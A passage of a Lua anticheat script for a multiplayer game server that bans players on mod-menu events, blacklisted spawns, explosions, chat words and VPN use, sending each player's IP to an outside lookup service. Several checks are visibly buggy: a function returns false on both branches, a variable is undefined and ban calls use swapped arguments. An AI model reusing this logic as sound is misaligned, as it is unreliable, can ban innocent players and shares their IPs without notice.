        elseif (_type == "menyoo") then
            PowerAC:BanPlayer(_src, "Tried to inject Menyoo Menu.","basic")
            PowerAC:BanPlayer(" Anti Menyoo", _src)
        elseif (_type == "antisuicide") then
            PowerAC:BanPlayer(_src, "Tried to SUICIDE using a menu","basic")
            PowerAC:BanPlayer(" Anti Suicide", _src)
        elseif (_type == "givearmour") then
            PowerAC:BanPlayer(_src, "Tried to Give Armor.","basic")
            PowerAC:BanPlayer(" Anti Give Armor", _src)
        elseif (_type == "devtools") then
            PowerAC:BanPlayer(_src, "Tried to open NUI_Devtools!","basic")
            PowerAC:BanPlayer(" Anti NUI_Devtools", _src)
        end
    end
end)



--//AntiGoldK1ds//--
RegisterCommand("say", function(source, args)
    for i = 1, #args do
        if PowerAC:has_value(POWER.GoldK1dsMsg, args[i]) then
            if POWER.Crash then
                PowerAC:BanPlayer(source, "G0ld K1ds")
            else
                PowerAC:Kick(source, "Blacklisted Command")
            end
        else
            PowerAC:Kick(source, "Blacklisted Command")
        end
    end
end, false)

--//AntiVPN//--
if POWER.AntiVPN then
    local function OnPlayerConnecting(name, setKickReason, deferrals)
        local ip = tostring(GetPlayerEndpoint(source))
        deferrals.defer()
        Wait(0)
        deferrals.update("Checking VPN...")
        PerformHttpRequest("http://check.getipintel.net/check.php?ip=" .. ip, function(errorCode, resultDatavpn, resultHeaders)
            if resultDatavpn == "N" then
                deferrals.done()
            else
                PowerAC:print("Warning", "Player: " .. name .. " kicked for using a VPN IP: " .. ip )
                deferrals.done("Please disable your VPN connection.")
            end
        end)
    end
    AddEventHandler("playerConnecting", OnPlayerConnecting)
    Citizen.CreateThread(function()
        while true do
            Wait(300000)
            for _, playerId in ipairs(GetPlayers()) do
                local name = GetPlayerName(playerId)
                local ip = GetPlayerEndpoint(playerId)
                PerformHttpRequest("http://check.getipintel.net/check.php?ip=" .. ip, function(errorCode, resultDatavpn, resultHeaders)
                    if resultDatavpn ~= "N" then
                        PowerAC:print("Warning", "Player: " .. name .. " kicked for using a VPN IP: " .. ip )
                        PowerAC:Kick(playerId, "Using a VPN")
                    end
                end)
            end
        end
    end)
end

AddEventHandler('ptFxEvent', function(sender, data)
    local _src = sender
    particlesSpawned[_src] = (particlesSpawned[_src] or 0) + 1
    if particlesSpawned[_src] > POWER.AntiParticles then
        PowerAC:BanPlayer(_src, "ParticlesFX Detect" ,"model")
        PowerAC:BanPlayer("ParticlesFX Detect", _src)
    end
end)



AddEventHandler("chatMessage", function(source, name, message)
    local _src = source
    if POWER.AntiBlacklistedWords then
        for k, word in pairs(POWER.BlacklistedWords) do
            if string.match(message:lower(), word:lower()) then
                PowerAC:BanPlayer(_src, "Tried to say a blacklisted word : " .. word,"basic")
                PowerAC:BanPlayer(" Blacklisted Word", _src)
            end
        end
    end
    if POWER.AntiFakeChat then
        local _playername = GetPlayerName(_src);
        if name ~= _playername then
            PowerAC:BanPlayer(_src, "Tried to fake a chat message : " .. word,"basic")
            PowerAC:BanPlayer(" Fake Chat Message", _src)
        end
    end
end)

----------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------

AddEventHandler("entityCreating",  function(entity)
    local owner = NetworkGetEntityOwner(entity)
    local pl = owner
    local cancelled = false
    local model = IsLegal(entity);
    if (model) then 
        if (owner ~= nil and owner > 0) then
            PowerAC:BanPlayer(owner, "Spawn Prop Detect" ,"model")
            PowerAC:BanPlayer("Spawn Prop Detect", owner)
        end
        CancelEvent()
        cancelled = true
    end
end)



function IsLegal(entity) 
    local model = GetEntityModel(entity)
    if (model ~= nil) then
        if (GetEntityType(entity) == 1 and GetEntityPopulationType(entity) == 7) then 
            local WhitelistPedModels = POWER.WhitelistPedModels;
            local isWhitelisted = false;
            for i = 1, #WhitelistPedModels do 
                if GetHashKey(WhitelistPedModels[i]) == model then 
                    isWhitelisted = true;
                end 
            end 
            if not isWhitelisted then 
				return false;
            else
                return false;
            end 
        end
        for i=1, #POWER.BlacklistedModels do 
            local hashkey = tonumber(POWER.BlacklistedModels[i]) ~= nil and tonumber(POWER.BlacklistedModels[i]) or GetHashKey(POWER.BlacklistedModels[i]) 
            if (hashkey == model) then
                if (GetEntityPopulationType(entity) ~= 7) then
                    return POWER.BlacklistedModels[i];
                else
                    return false 
                end
            end
        end
    end
    return false
end




if POWER.GiveWeaponDetection then
    AddEventHandler("giveWeaponEvent", function(sender, data)
        if data.givenAsPickup == false then
            PowerAC:BanPlayer(sender, "Give Weapon")
            CancelEvent()
        end
    end)

    AddEventHandler("RemoveWeaponEvent", function(sender, data)
        CancelEvent()
        PowerAC:BanPlayer(sender, "Remove Weapon")
    end)

    AddEventHandler("RemoveAllWeaponsEvent", function(sender, data)
        CancelEvent()
        PowerAC:BanPlayer(sender, "Remove All Weapons")
    end)

    AddEventHandler("GiveAllWeapons", function(sender, data)
        CancelEvent()
        PowerAC:BanPlayer(sender, "Give All Weapons")
    end)

    AddEventHandler("giveWeaponEvent", function(sender, data)
        if data.GiveAllWeapons == true then
            PowerAC:BanPlayer(sender, "Give Weapon")
            CancelEvent()
        end
    end)

    AddEventHandler("RemoveWeaponFromPedEvent", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "Remove Weapon")
    end)

    AddEventHandler("RemoveWeaponEvent", function(source, data)
        if data.FromPed then
            CancelEvent()
            PowerAC:BanPlayer(source, "Remove Weapon")
        end
    end)

    AddEventHandler("RemoveWeaponEvent", function(source, data)
        CancelEvent()
        PowerAC:BanPlayer(source, "Remove Weapon")
    end)
end

if #POWER.BlacklistedTriggers ~= 0 then
    for k, events in pairs(POWER.BlacklistedTriggers) do
        RegisterServerEvent(events)
        AddEventHandler(events, function()
            PowerAC:BanPlayer(source, "Blacklisted Trigger: " .. events .. " #6")
            CancelEvent()
        end)
    end
end

if POWER.ClearPedTaskDetection then
    AddEventHandler("ClearPedTasksEvent", function(sender, data)
        sender = tonumber(sender)
        local entity = NetworkGetEntityFromNetworkId(data.pedId)
        if DoesEntityExist(entity) then
            local owner = NetworkGetEntityOwner(entity)
            if owner ~= sender then
                CancelEvent()
                PowerAC:BanPlayer(owner, "ClearPedTask")
            end
        end
    end)

    AddEventHandler("clearPedTasksEvent", function(source, data)
        if data.immediately then
            CancelEvent()
            PowerAC:BanPlayer(source, "ClearPedTask")
        end
    end)
end

AddEventHandler('entityCreated', function(entity)
    -- local entity = entity
    if not DoesEntityExist(entity) then return end
    local src = NetworkGetEntityOwner(entity)
    local entID = NetworkGetNetworkIdFromEntity(entity)
    local model = GetEntityModel(entity)

	if POWER.SpawnVehiclesDetection then
	    for i, objName in ipairs(POWER.BlacklistedVehicles) do
		    if model == GetHashKey(objName) then
				TriggerClientEvent("PowerAC:DeleteCars", -1,entID)
				Citizen.Wait(800)
				PowerAC:BanPlayer(src,"BlacklistedCar: " .. model .. " #8")
			    break
            end
		end
	end

	if POWER.SpawnPedsDetection then
	    for i = 1, #POWER.NukeBlacklistedPeds do
            if model == GetHashKey(POWER.NukeBlacklistedPeds[i]) then
				TriggerClientEvent("PowerAC:DeletePeds", -1, entID)
				Citizen.Wait(800)
				PowerAC:BanPlayer(src, "BlacklistedPed: " .. model .. " #9")
				break
            end
		end
	end

	if POWER.NukeDetection then
	    for i = 1, #POWER.NukeBlacklistedObjects do
			if model == GetHashKey(POWER.NukeBlacklistedObjects[i]) then
				TriggerClientEvent("PowerAC:DeleteEntity", -1, entID)
                TriggerClientEvent('PowerAC:DeleteAttach', -1)
				Citizen.Wait(800)
				PowerAC:BanPlayer(src, "BlacklistedObejct: " .. model .. " #10")
			    break
            end
	    end
	end
end)


if POWER.ExplosionDetection then
    AddEventHandler('explosionEvent', function(sender, ev)
		CancelEvent()
		if POWER.ExplosionsList[ev.explosionType] then
	        PowerAC:BanPlayer(sender, "Explosion Detect")
		end

        if ev.isAudible == false then
            PowerAC:BanPlayer(sender, "Audible Explosion: ")
        end

        if ev.isInvisible == true then
            PowerAC:BanPlayer(sender, "Invisible Explosion: ")
        end

        if ev.damageScale > 1.0 then
            PowerAC:BanPlayer(sender, "DamageModified Explosion: ")
        end
    end)
end

if POWER.TazeDetection then
    AddEventHandler("ShootSingleBulletBetweenCoordsEvent", function(source, data)
        if data.weapon_stungun then
            CancelEvent()
            PowerAC:BanPlayer(source, "ShootSingleBullet")
        end
    end)

    AddEventHandler("ShootSingleBulletBetweenCoords", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "ShootSingleBullet")
    end)

    AddEventHandler("ShootSingleBulletBetweenEvent", function(source, data)
        if data.coords then
            CancelEvent()
            PowerAC:BanPlayer(source, "ShootSingleBullet")
        end
    end)

    AddEventHandler("shootSingleBulletBetweenCoordsEvent", function(source, data)
        if data.givenAsPickup == false then
            CancelEvent()
            PowerAC:BanPlayer(source, "ShootSingleBullet")
        end
    end)

    AddEventHandler("ShootSingleBulletBetweenCoords", function(source, data)
        if data.weapon_stungun then
            CancelEvent()
            PowerAC:BanPlayer(source, "ShootSingleBullet")
        end
    end)

    AddEventHandler("ShootEvent", function(source, data)
        if data.Player then
            CancelEvent()
            PowerAC:BanPlayer(source, "ShootSingleBullet")
        end
    end)

    AddEventHandler("ShootEvent", function(source, data)
        if data.player then
            CancelEvent()
            PowerAC:BanPlayer(source, "ShootSingleBullet")
        end
    end)
end

if POWER.AmmoDetection then
    AddEventHandler("AddAmmoToPed", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "AddAmmoToPed")
    end)

    AddEventHandler("AddAmmoToPedEvent", function(source, data)
        if data.ByType then
            CancelEvent()
            PowerAC:BanPlayer(source, "AddAmmoToPedEvent")
        end
    end)
end

if POWER.StaminaDetection then
    AddEventHandler("ResetPlayerStamina", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "ResetPlayerStamina")
    end)
end

if POWER.GetResourceDetection then
    AddEventHandler("GetResourcesEvent", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "GetResource")
    end)

    AddEventHandler("GetResourceEvent", function(source, data)
        if data.ByFindIndex then
            CancelEvent()
            PowerAC:BanPlayer(source, "GetResource")
        end
    end)
end

if POWER.DisguisedResource then
    Citizen.CreateThread(function()
        while true do
            if PowerAC:CheckResourceName() then
                PowerAC:print("Warning", "Please rename the Anticheat Resource: ^1" .. GetCurrentResourceName() .. "^7")
            end
            Citizen.Wait(300000)
        end
    end)
end


if POWER.ScramblerInjectionDetection then
    RegisterServerEvent('613cd851-bb4c-4825-8d4a-423caa7bf2c3')
    AddEventHandler('613cd851-bb4c-4825-8d4a-423caa7bf2c3', function(name)
        PowerAC:BanPlayer(source, "scrambler:injectionDetected #100")
    end)
end

if POWER.PlankeCkDetection then
    RegisterCommand('dd', function(source, args)
        PowerAC:BanPlayer(source, "Planke Ck Commands")
    end)
    
    RegisterCommand('ck', function(source, args)
        PowerAC:BanPlayer(source, "Planke Ck Commands")
    end)

    RegisterNetEvent('showSprites')
    AddEventHandler('showSprites', function()
        PowerAC:BanPlayer(source, "Planke Ck Commands")
    end)

    RegisterNetEvent('showBlipz')
    AddEventHandler('showBlipz', function()
        PowerAC:BanPlayer(source, "Planke Ck Commands #123")
    end)
end

if #POWER.ForbiddenCrashes ~= 0 then
    AddEventHandler('playerDropped', function(reason)
        for i = 1, #POWER.ForbiddenCrashes do
            if string.find(reason, POWER.ForbiddenCrashes[i]) then
                PowerAC:BanPlayer(source, "ForbiddenCrash - " .. POWER.ForbiddenCrashes[i] .. " #125")
            end
        end
    end)
end

if POWER.RemoveWeaponDetection then
    AddEventHandler("RemoveAllPedWeaponsEvent", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "Remove weapon")
    end)

    AddEventHandler("RemoveAllPedWeaponsEvent", function(source, data)
        if data.ByType == false then
            CancelEvent()
            PowerAC:BanPlayer(source, "Remove weapon")
        end
    end)

    AddEventHandler("RemoveAllPedWeapons", function(source)
        CancelEvent()
        PowerAC:BanPlayer(source, "Remove weapon")
    end)
end